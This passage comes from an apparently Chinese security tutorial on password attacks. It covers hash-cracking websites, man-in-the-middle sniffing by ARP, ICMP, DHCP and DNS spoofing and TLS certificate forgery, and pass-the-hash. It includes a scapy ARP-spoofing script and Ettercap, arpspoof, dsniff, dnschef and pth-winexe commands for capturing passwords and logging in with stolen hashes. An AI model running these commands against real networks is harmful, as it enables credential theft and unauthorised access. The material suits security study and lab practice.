<ul><li><a href="https://www.cmd5.com/" rel="nofollow">https://www.cmd5.com/</a>：“一直被抄袭，从未被超越”，可以轻松破解MD5、SHA1、MySQL、NTLM等HASH值，如果这个网站跑不出来，说明密码已相当复杂</li><li><a href="https://hashes.com/en/decrypt/hash" rel="nofollow">https://hashes.com/en/decrypt/hash</a>：免费破解MD5、SHA1、MySQL、NTLM、SHA256、SHA512等HASH值</li></ul> 
<h3><a id="_419"></a>四、密码嗅探</h3> 
<p><strong>基本原理</strong>：利用中间人攻击，嗅探、分析目标和网络节点之间的数据包，完成密码窃取。<br> <img src="https://images2.imgbox.com/4c/a8/fZHZxNEE_o.png" alt="中间人攻击"></p> 
<p align="center">图1 中间人攻击</p> 
<h4><a id="_424"></a>（一）基本原理</h4> 
<p>注意节点设备集线器和交换机的区别：</p> 
<ul><li>集线器工作在一层，全端口转发数据包，不作任何过滤</li><li>交换机工作在二层，交叉总线矩阵使端口之间独享带宽，根据MAC地址表对数据进行过滤，减缓流量拥塞状况</li></ul> 
<p>因此集线器连接的设备网卡在混杂模式可以收到所有设备发出的数据包，而交换机连接的设备网卡在混杂模式默认只能收到发给自己的单播数据包和广播数据包。</p> 
<h5>1.ARP欺骗</h5> 
<p>ARP协议设计有严重安全缺陷，建立连接过程仅包括请求和响应两个部分，这两个部分相对独立，响应数据包可以单独伪造，和请求之间没有必然联系，所以它也被称为基于传闻的协议，网络设备不会去验证ARP响应信息的来源。攻击者可以伪造网关的ARP ACK<strong>或者Request</strong>包，对攻击目标实施欺骗，使得攻击目标数据包经由攻击者转发，实现信息嗅探。</p> 
<h5>2.ICMP重定向</h5> 
<p>ICMP通常用于完成差错通知和信息查询，在特定的情况下，当路由器检测到一台机器使用非优化路由的时候，它会向该主机发送一个ICMP重定向报文，请求主机改变路由，指导数据包的正确流向，正常工作时如图2所示：</p> 
<p>（图片来源：<a href="https://www.cnblogs.com/KevinGeorge/p/7866840.html" rel="nofollow">https://www.cnblogs.com/KevinGeorge/p/7866840.html</a>）， 其中R1提示C1改变路由即是应用ICMP。<br> <img src="https://images2.imgbox.com/33/26/1WqwtAbd_o.jpg" alt="ICMP重定向原理"></p> 
<p align="center">图2 ICMP重定向原理</p> 
<p>ICMP重定向报文没有协议状态检查，以及合法性机制验证，可以结合ARP欺骗，通过伪造网关向攻击目标发送ICMP重定向报文，使得攻击目标数据包经由攻击者转发，实现信息嗅探。</p> 
<p><font color="red">注意：路由器不会响应ICMP重定向包，路由重定向只对客户端有效，数据转发过程是单工通信。</font></p> 
<h5>3.DHCP欺骗</h5> 
<p>DHCP建立连接包括 <strong>Discover-&gt;Offer-&gt;Request-&gt;Ack</strong> 四个部分，当需要分配IP的主机发出Discover或Request包时，攻击者立即响应，修改配置指定自身IP为网关地址，使得攻击目标数据包经由攻击者转发，实现信息嗅探。</p> 
<p><font color="red">注意：网关不会响应DHCP Offer、Ack 包，DHCP欺骗只对客户端有效，数据转发过程是单工通信。</font></p> 
<h5>4.交换机端口欺骗</h5> 
<p>交换机在记录MAC地址转发表时，会根据数据包的源MAC地址进行学习，如果伪造数据包，将源MAC地址设置为攻击目标MAC地址，目的MAC地址设置为自身MAC地址，这样发出的数据包可以诱使其他主机将本应发往攻击目标的数据发给自己，从而实现嗅探信息。<em><strong>适合ARP静态绑定的环境。</strong></em></p> 
<h5>5.DNS欺骗</h5> 
<p>DNS查询分为两个过程，第一个过程是查询主机到本地域名服务器的过程，为递归查询，第二个过程为本地域名服务器到根域名服务器、顶级域名服务器、权限域名服务器的查询过程，为迭代查询，最后本地域名服务器将查询结果返回给查询主机。DNS欺骗通过响应目标主机的查询数据包完成欺骗，配置错误的IP地址。</p> 
<h5>6.SSL/TLS证书伪造</h5> 
<p>HTTPS，即 HTTP over SSL/TLS，其建立链接主要是<strong>用非对称加密传输对称加密密钥的过程，</strong> 之后通信数据用对称密钥加密。SSL/TLS证书是用CA机构私钥加密的Server公钥信息，证书伪造即攻击者在可以截获攻击目标上行数据的基础上，完成ServerHello以及之后的工作，同时向真正的服务器发送相同的HTTPS请求建立连接，完成攻击目标和服务器之间的数据中转，以此进行信息嗅探。</p> 
<p><img src="https://images2.imgbox.com/70/ea/9hLEoeYc_o.jpg" alt="HTTPS建立通信过程"></p> 
<p align="center">图3 HTTPS建立通信过程</p> 
<h4><a id="_466"></a>（二）攻击实现</h4> 
<h5>1.编写脚本</h5> 
<p>例如用python中scapy模块编写发包脚本，实现ARP欺骗：</p> 
<pre><code class="prism language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
etherSec <span class="token operator">=</span> Ether<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"00:0c:29:0c:54:a4"</span><span class="token punctuation">,</span>src<span class="token operator">=</span><span class="token string">"00:0c:29:49:54:4a"</span><span class="token punctuation">)</span> 
<span class="token comment"># dst是目标主机MAC地址，src是嗅探主机MAC地址</span>

arpSec <span class="token operator">=</span> ARP<span class="token punctuation">(</span>pdst<span class="token operator">=</span><span class="token string">"192.168.43.23"</span><span class="token punctuation">,</span>psrc<span class="token operator">=</span><span class="token string">"192.168.43.1"</span><span class="token punctuation">)</span>    
<span class="token comment"># pdst是目标主机ip，psrc是网关ip</span>

arpPack <span class="token operator">=</span> etherSec<span class="token operator">/</span>arpSec
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sendp<span class="token punctuation">(</span>arpPack<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'arpPack send OK\n'</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre> 
<p>攻击成功后，可以看到攻击目标中ARP记录网关MAC地址已更改：</p> 
<p><img src="https://images2.imgbox.com/b8/76/TxkmSxv6_o.jpg" alt="ARP欺骗结果"></p> 
<p align="center">图4 ARP欺骗结果</p> 
<h5>2.Ettercap</h5> 
<p>Ettercap是经典的中间人攻击工具集，支持SSH1、SSL/TLS中间人攻击，用户操作界面分为四种：<strong>-T（文本界面）、-G（图形界面）、-C（基于文本的图形界面）、-D（后台模式）</strong>，划分为五个模块：</p> 
<p><strong>（1）Sniffer</strong>：负责数据包转发，分为Unified和Bridge：</p> 
<ul><li>Unified：单网卡情况下使用，<em><strong>独立</strong></em> 完成三层数据包转发，过程中禁用内核IP_Forward功能。</li><li>Bridge：双网卡情况下一层MITM模式，相当于两个网卡桥接，隐蔽性高，不可用于网关。</li></ul> 
<p><strong>（2）MITM</strong>：把流量重定向到Ettercap主机，MITM模块包括：ARP欺骗、ICMP重定向、DHCP欺骗、DNS欺骗、交换机端口欺骗等。指定目标格式：<strong>MAC/IPs/IPv6/Ports</strong><br> eg：</p> 
<pre><code class="prism language-bash">ettercap -i eth0 -T -M arp:remote -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message
<span class="token comment"># -T：命令行模式</span>
<span class="token comment"># -M：指定MITM模块，arp:remote全双工嗅探数据</span>
<span class="token comment"># -q：只会打印用户、密码等重要信息</span>
<span class="token comment"># -F：指定Filter</span>
<span class="token comment"># -P：指定Plugin</span>
<span class="token comment"># -w：嗅探所有的网络流量写入指定pcap文件</span>
<span class="token comment"># -l：记录关键日志信息，生成记录信息的文件格式为eci，需要用etterlog查看</span>
<span class="token comment"># -L：记录所有日志信息，生成记录信息的文件格式为eci，记录数据包的文件格式为ecp，需要用etterlog查看</span>
<span class="token comment"># -m：记录所有的操作信息</span>

<span class="token comment">#SSL/TLS MITM</span>
vim /etc/ettercap/etter.conf
<span class="token comment"># 在配置文件中在Linux section下将reidr_command_on和reidr_command_off配置行加上，这样再进行MITM攻击时会自动完成SSL/TLS证书伪造</span>
</code></pre> 
<p><strong>（3）Filter</strong>：利用脚本进行数据筛选，<code>/usr/share/ettercap/</code>中带filter的都是筛选文件<br> eg：</p> 
<pre><code class="prism language-bash"><span class="token comment"># SSH-2.xx(only support ssh2)/SSH-1.99(support ssh1 and ssh2)/SSH-1.51(only support ssh1)</span>
<span class="token comment"># 目前ettercap只能对ssh1进行MITM攻击</span>
<span class="token comment"># 进行ssh链接请求时，ettercap会截获ssh服务器返回的response包</span>
<span class="token comment"># 如果ssh服务器提供的是1.99版本，则将服务降级到ssh1版本</span>
etterfilter etter.filter.ssh -o ssh.ef
<span class="token comment"># 对etter.filter.ssh源文件进行编译，生成ef可执行文件，执行ettercap命令时进行调用</span>
<span class="token comment"># 该filter可以探测攻击目标的ssh版本，若是1.99则会降级为1.51</span>
</code></pre> 
<p><strong>（4）Log</strong>：日志记录，文件格式为eci（信息日志）和ecp（数据日志），内容经过加密，需要通过etterlog查看<br> eg：</p> 
<pre><code class="prism language-bash">etterlog -p log.eci 
<span class="token comment"># 查看获取的用户、密码信息</span>

etterlog -c log.ecp 
<span class="token comment"># 列出Log中的数据包信息</span>

etterlog -c -f /1.1.1.1/ log.ecp
<span class="token comment"># 只列出源地址或终端地址为target的数据包</span>
</code></pre> 
<p><strong>（5）Plugin</strong>：集成插件，包括dns_spoof等模块<br> eg：</p> 
<pre><code class="prism language-bash">vim /etc/ettercap/etter.dns
<span class="token comment"># 修改Ettercap中的域名重定向文件</span>

ettercap -Tq -M arp:remote -i eth0 /192.168.1.1// /192.168.1.1// -P dns_spoof
</code></pre> 
<p><font color="red">注意：Ettercap默认只有在创建socket时会调用root权限，后续操作都都是以nobody身份运行，ec_uid为65534，可能导致后续读写文件受限，运行时可以在其主配文件 <code>/etc/ettercap/etter.conf</code> 中将ec_uid修改为0，但是安全性会降低。</font></p> 
<h5>3.其他工具</h5> 
<p>除了像Ettercap一类的MITM工具集，还有一些功能相对单一的MITM工具：</p> 
<ul><li> <p><strong>Dsniff</strong>：功能强大的网络嗅探工具包，集 <strong>dsniff</strong>、<strong>filesnarf</strong>、<strong>mailsnarf</strong>、<strong>urlsnarf</strong>、<strong>webspy</strong>、<strong>arpspoof</strong>、<strong>dnsspoof</strong> 等工具于一体，最新版本在2001年就已经发布，早已不再更新，目前 Kali 中不再默认安装 dsniff，需要下载。</p> </li><li> <p><strong>driftnet</strong> ：图片截取工具</p> </li><li> <p><strong>dnschef</strong>：DNS欺骗工具</p> </li></ul> 
<pre><code class="prism language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> dsniff

<span class="token comment"># kali中ip数据包转发的功能默认是关闭的，需要开启</span>
<span class="token keyword">echo</span> 1 <span class="token operator">&gt;</span> /proc/sys/net/ipv4/ip_forward

arpspoof -i eth0 -t 192.168.43.23 -r 192.168.43.1
<span class="token comment"># -t：攻击目标ip，-r：网关ip</span>
<span class="token comment"># 攻击成功后攻击者就成了中间人，转发攻击目标和网关之间的信息</span>

<span class="token comment"># 在完成ARP欺骗后，可以进一步使用dsniff、urlsnarf、webspy、driftnet等工具进行攻击</span>
dsniff -i eth0 -m
<span class="token comment"># 仅截取流量中的密码信息</span>
<span class="token comment"># -m：自动加密方式检测</span>
<span class="token comment"># /usr/share/dsniff/dsniff.services文件存放触发加密算法</span>

urlsnarf -i eth0
<span class="token comment"># 截取本机网卡流量中的url</span>

webspy -i eth0 1.1.1.10
<span class="token comment"># 截取指定主机web网址</span>
<span class="token comment"># 目前运行仍不稳定</span>

driftnet -i eth0 -a -d tempdir
<span class="token comment"># -a：不实时显示图片，将截取图片保存到temdir目录</span>
<span class="token comment"># -d：指定图片保存目录</span>

<span class="token comment"># 使用dnschef的前提是能够修改攻击目标的本地域名服务器</span>
<span class="token comment"># 将其配置为攻击者的IP，然后使用dnschef命令</span>
dnschef --fakeip<span class="token operator">=</span>1.1.1.10 --fakedomains<span class="token operator">=</span>www.google.com,www.youtube.com -q
<span class="token comment"># --fakeip：被欺骗的域名要访问的IP</span>
<span class="token comment"># --fakedomains：需要欺骗的域名</span>
</code></pre> 
<h3><a id="Pass_the_HASHPTH_592"></a>五、Pass the HASH（PTH）</h3> 
<p>密码破解耗费时间资源巨大，对于没有加盐的静态HASH认证登录，可以使用密文直接提交给服务器完成身份认证，这种攻击方式对企业中使用ghost等工具克隆安装的系统更有威胁性。</p> 
<ul><li>NTLM/LM是没有加盐的静态HASH，可以基于此对Window系统采用PTH攻击</li></ul> 
<p>eg：</p> 
<pre><code class="prism language-bash">pth-winexe -U w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063716ab7fe2a11faf126d8 //1.1.1.1 cmd
<span class="token comment"># 使用方法：pth-winexe [OPTION]... //HOST COMMAND</span>
<span class="token comment"># -U USERNAME[%HASH_PASS]</span>
</code></pre>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/d6eeff7a0c109b4b81f2646706b1f205/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Linux 下vscode配置texlive</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/4ccdb9672d27efeaab5aa05f24d4fc2c/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">SpringDoc --＞ Swagger的完美替代品 使用详解【可完全匹配新版Springboot】可视化RESTful风格 Web 服务接口api文档</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>